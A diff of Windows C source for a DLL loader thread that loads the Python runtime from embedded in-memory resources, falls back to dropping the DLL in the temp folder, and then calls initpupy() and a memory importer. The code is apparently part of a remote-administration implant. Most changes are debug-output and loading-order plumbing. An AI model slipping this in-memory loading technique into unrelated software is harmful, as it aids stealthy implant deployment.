@@ -43,22 +43,35 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 	char * ppath;
 	FILE * f;
 	char tmp_python_dll_path[MAX_PATH];
-	//char tmp_manifest_path[MAX_PATH];
+	char tmp_manifest_path[MAX_PATH];
 	char tmp_path[MAX_PATH];
+	ULONG_PTR cookie = 0;
+	/*
 	ACTCTX ctx;
 	BOOL activated;
 	HANDLE k32;
-	//HANDLE (WINAPI *CreateActCtx)(PACTCTX pActCtx);
-	//BOOL (WINAPI *ActivateActCtx)(HANDLE hActCtx, ULONG_PTR *lpCookie);
-	//void (WINAPI *AddRefActCtx)(HANDLE hActCtx);
-	//BOOL (WINAPI *DeactivateActCtx)(DWORD dwFlags, ULONG_PTR ulCookie);
+	HANDLE (WINAPI *CreateActCtx)(PACTCTX pActCtx);
+	BOOL (WINAPI *ActivateActCtx)(HANDLE hActCtx, ULONG_PTR *lpCookie);
+	void (WINAPI *AddRefActCtx)(HANDLE hActCtx);
+	BOOL (WINAPI *DeactivateActCtx)(DWORD dwFlags, ULONG_PTR ulCookie);
+	*/
 	PyGILState_STATE restore_state;
 
-	_load_python("msvcr90.dll", resources_msvcr90_dll_start); // needed for the python interpreter
+	if(!GetModuleHandle("msvcr90.dll")){
+		#ifndef QUIET
+		fprintf(stderr,"loading msvcr90.dll\n");
+		#endif
+		_load_msvcr90(resources_msvcr90_dll_start);
+	}
+	else{
+		#ifndef QUIET
+		fprintf(stderr,"msvcr90.dll already loaded\n");
+		#endif
+	}
 
 	GetTempPath(MAX_PATH, tmp_path);
 	//InitializeCriticalSection(&csInit);
-	/*
+	/*	
 	k32 = LoadLibrary("kernel32");
 	CreateActCtx = (void*)GetProcAddress(k32, "CreateActCtxA");
 	ActivateActCtx = (void*)GetProcAddress(k32, "ActivateActCtx");
@@ -80,7 +93,7 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 	fprintf(f,"%s",resource_python_manifest);
 	fclose(f);
 	#ifndef QUIET
-	printf("manifest written to %s\n",tmp_manifest_path);
+	fprintf(stderr,"manifest written to %s\n",tmp_manifest_path);
 	#endif
 	ctx.lpSource = tmp_manifest_path;
 
@@ -92,37 +105,55 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 	#ifndef QUIET
 	DeleteFile(tmp_manifest_path);
 	#endif
-	*/
+	*/	
 
 	if(!Py_IsInitialized)
 	{
 		int res=0;
 		//activated = ActivateActCtx(MyActCtx, &actToken);
-		if(!_load_python("python27.dll", resources_python27_dll_start)){
-			
+		//cookie=_My_ActivateActCtx();
+		if(GetModuleHandle("python27.dll")){
+			HANDLE hp;
 			#ifndef QUIET
-			printf("loading python27.dll from memory failed\n");
+			fprintf(stderr,"python27.dll is already loaded\n");
 			#endif
+			_load_python_FromFile("python27.dll"); // does not actually load a new python, but uses the handle of the already loaded one
+		}
+		else{
+			if(!_load_python("python27.dll", resources_python27_dll_start)){
+				#ifndef QUIET
+				fprintf(stderr,"loading python27.dll from memory failed\n");
+				#endif
 
-			//if loading from memory fail, we write dll on disk
-			sprintf(tmp_python_dll_path, "%spython27.dll", tmp_path);
+				//if loading from memory fail, we write dll on disk
+				sprintf(tmp_python_dll_path, "%spython27.dll", tmp_path);
 
-			f=fopen(tmp_python_dll_path,"wb");
-			res=fwrite(resources_python27_dll_start, sizeof(char), resources_python27_dll_size, f);
-			fclose(f);
+				f=fopen(tmp_python_dll_path,"wb");
+				res=fwrite(resources_python27_dll_start, sizeof(char), resources_python27_dll_size, f);
+				fclose(f);
 
-			if(!_load_python(tmp_python_dll_path, NULL)){
-				if(!_load_python("python27.dll", NULL)){ // try loading from system PATH
-					#ifndef QUIET
-					printf("could not load python dll\n");
-					#endif
+				if(!_load_python(tmp_python_dll_path, NULL)){
+					if(!_load_python("python27.dll", NULL)){ // try loading from system PATH
+						#ifndef QUIET
+						fprintf(stderr,"could not load python dll\n");
+						#endif
+					}
 				}
 			}
-		}
 		#ifndef QUIET
-		printf("python interpreter loaded\n");
+		fprintf(stderr,"python interpreter loaded\n");
 		#endif
-
+		}
+		//_My_DeactivateActCtx(cookie);
+	}
+	#ifndef QUIET
+	fprintf(stderr,"calling PyEval_InitThreads() ...\n");
+	#endif
+	PyEval_InitThreads();
+	#ifndef QUIET
+	fprintf(stderr,"PyEval_InitThreads() called\n");
+	#endif
+	if(!Py_IsInitialized()){
 		ppath = Py_GetPath();
 		strcpy(ppath, "\x00");
 
@@ -131,21 +162,19 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 		Py_Initialize();
 
 		#ifndef QUIET
-		printf("Py_Initialize()\n");
+		fprintf(stderr,"Py_Initialize()\n");
 		#endif
+		PySys_SetObject("frozen", PyBool_FromLong(1));
 	}
-
-
 	restore_state=PyGILState_Ensure();
-	PySys_SetObject("frozen", PyBool_FromLong(1));
 
 	init_memimporter();
 	#ifndef QUIET
-	printf("init_memimporter()\n");
+	fprintf(stderr,"init_memimporter()\n");
 	#endif
 	initpupy();
 	#ifndef QUIET
-	printf("initpupy()\n");
+	fprintf(stderr,"initpupy()\n");
 	#endif
 
 	//mod = PyImport_ImportModule("sys");
@@ -153,9 +182,8 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 	//MessageBoxA(0, "hey ! :D", "DLL Message", MB_OK | MB_ICONINFORMATION);
 
 	/* We execute then in the context of '__main__' */
-	PyEval_InitThreads();
 	#ifndef QUIET
-	printf("starting evaluating python code ...\n");
+	fprintf(stderr,"starting evaluating python code ...\n");
 	#endif
 	//PyRun_SimpleString("print 'ok from python'");
 	m = PyImport_AddModule("__main__");
@@ -184,7 +212,7 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 	/*
 	if (!DeactivateActCtx(0, actToken)){
 	#ifndef QUIET
-		printf("LOADER: Error deactivating context!\n!");
+		fprintf(stderr,"LOADER: Error deactivating context!\n!");
 	#endif
 	}
 	*/
